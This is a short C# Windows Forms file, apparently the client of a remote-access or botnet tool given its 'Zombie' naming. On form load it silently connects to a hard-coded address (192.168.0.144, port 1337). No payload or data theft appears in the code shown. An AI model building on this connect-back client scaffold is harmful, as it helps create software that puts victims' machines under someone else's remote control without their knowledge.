using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Zombie.Functions;
using Zombie.Web;

namespace Zombie
{
    public partial class ZombieForm : Form
    {
        public ZombieForm()
        {
            InitializeComponent();


        }

        private void ZombieForm_Load(object sender, EventArgs e)
        {

            Client.Start("192.168.0.144", 1337);
        }


    }
}
